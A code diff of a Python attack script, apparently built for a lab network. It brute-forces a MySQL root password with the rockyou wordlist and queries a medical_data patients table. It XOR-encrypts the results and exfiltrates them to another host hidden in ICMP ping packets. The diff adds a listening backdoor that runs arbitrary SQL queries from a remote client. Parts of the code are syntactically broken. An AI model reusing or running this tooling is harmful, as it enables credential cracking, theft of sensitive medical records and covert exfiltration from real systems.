@@ -11,10 +11,10 @@ os.chdir(sys._MEIPASS)
 # Crack password
 
 # function that checks if pw is correct
-def connect(pw, host):
+def connect(pw):
     try:
         db = mysql.connect(
-            host = host,
+            host = "localhost",
             user = "root",
             passwd = pw
         )
@@ -26,9 +26,10 @@ def connect(pw, host):
 def getPassword(wordlist, host):
     for word in wordlist:
         print(word)
-        if connect(word, host)=='success':
+        if connect(word)=='success':
             pw = word
-    return pw
+            return pw
+    return "NO PASSWORD"
 
 # helper function to make result a string
 def query_to_string(x):
@@ -37,19 +38,23 @@ def query_to_string(x):
     return x
 
 # Get data
-def get_data(pw, dest):
-    db = mysql.connect(
-        host = host,
-        user = "root",
-        passwd = pw
-    )
+def get_data(pw, query):
+    try:
+        db = mysql.connect(
+            host = "localhost",
+            user = "root",
+            passwd = pw
+        )
 
-    cursor = db.cursor()
+        cursor = db.cursor()
 
-    cursor.execute("use medical_data;")
+        cursor.execute("use medical_data;")
 
-    cursor.execute("select * from patients where name = 'Our Guy';")
-    result = cursor.fetchall()
+        cursor.execute(query) #"select * from patients where name = 'Our Guy';"
+        result = cursor.fetchall()
+    except mysql.connector.Error as err:
+        return err
+
     data = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([query_to_string(x) for x in tup]) for tup in result])
 
     # result in string format without nonalphanumeric chars.
@@ -60,19 +65,13 @@ def get_data(pw, dest):
 def XOR(plaintext, key):
     return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(plaintext, cycle(key)))
 
-# helper function to generate password string
-def passwordGen(stringLength):
-    letters = string.ascii_letters
-    return ''.join(random.choice(letters) for i in range(stringLength))
-
-# takes list of tuples, outputs encrypted string.
+# takes password string, outputs encrypted string.
 def encrypt_data(data):
 
-    # simple xor encryption, key is created and recorded in meterpreter shell.
-    key_len = len(data.encode('utf-8'))
-    key = passwordGen(key_len)
+    # simple xor encryption
+    key = "BeyWfkPjXCERVUCXUIhEypFFYesgqPfKjLfEhZEqKTnolrrcekCJdGQtdVgnbXcBqkPcGyOEIrmpgbhqJjfMIClzdwNmmhhrHPJXIqCtdyXlmrlEyWmsIPvGHrlGmBkkdLKjRhNxueKCzRWaMiTUYTHHwsfvaNBShLUwmgXLQulWNBjiVOAwsTWjDCCBhrGQHJNCgUKBIneOjZsKZMHRPQecKRFLVksEvRDFnOmJihvTwIRuZgiZuLUiBwCxVjrbvbaNnKqdWuUPJFtfAlADmelZQYQoRaNaKZCeYWtmnzdgJdRlvS"
     enc_data = XOR(data, key)
-    return enc_data, key
+    return enc_data
 
 # Exfiltrate data in a packet header
 def checksum(data):
@@ -100,7 +99,7 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
         s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
     except socket.error as e:
-        raise e
+        return e
 
     ICMP_ECHO_REQUEST = 8
     ICMP_CODE = 0
@@ -126,7 +125,6 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
     packet = header + data
 
     s.sendto(packet, (dest_addr, 0))
-    print("sent ping. Waiting for reply.")
     while True:
         try:
             recPacket, addr = s.recvfrom(1024)
@@ -143,27 +141,48 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
                     "SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                     % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                 time.sleep(1)
-                return delay
+                ret = ("SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms" % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay)
+                return ret
         except socket.timeout:
-            print("Request timeout for icmp_seq", ICMP_SEQ)
-            return False
+            ret = ("Request timeout for icmp_seq %d" % ICMP_SEQ)
+            return
         except Exception as e:
-            raise e
+            return e
 
 def main():
     host = "192.168.20.12"
-    destination = "192.168.20.9"
-    print("here we are:", os.getcwd())
+    client = "192.168.20.9"
     wordlist=open("rockyou-75.txt","r+").read().splitlines()
+    password = getPassword(wordlist)
+    if password == "NO PASSWORD":
+        raise ValueError ("Wordlist didn't contain password to MySQL DB.")
 
-    password = getPassword(wordlist, host)
-    print("got password:", password)
-    sql_result = get_data(password, host)
-    print("got sql data:", sql_result)
-    data, key = encrypt_data(sql_result)
-    print("encrypted data:", data)
-    print("with key:", key)
-    result = sendOnePing(1, destination, 102, data)
+    server_socket = socket.socket(socket.AF_INET,
+                  socket.SOCK_STREAM)
+    server_socket.bind((host, 8821))
+
+    server_socket.listen(1)
+
+    (client_socket, client_address) = server_socket.accept()
+    client_socket.send("I'm in the MySQL database. Send me a query, or type EXIT to shut me down!")
+    while True:
+        client_input = client_socket.recv(1024)
+        if !client_input:
+            client_socket.send("I'm in the MySQL database. Send me a query, or type EXIT to shut me down.")
+        else:
+            if client_input.decode() == 'EXIT':
+                break
+            else:
+                sql_result = get_data(password, client_input.decode())
+                client_socket.send("Received MySQL data")
+                data = encrypt_data(sql_result)
+                client_socket.send("Query Encrypted.")
+                client_socket.send("Sending encrypted data via ICMP ping.")
+                result = sendOnePing(1, client, 102, data)
+                client_socket.send(result)
+
+    client_socket.close()
+    server_socket.close()
 
 if __name__ == "__main__":
     main()
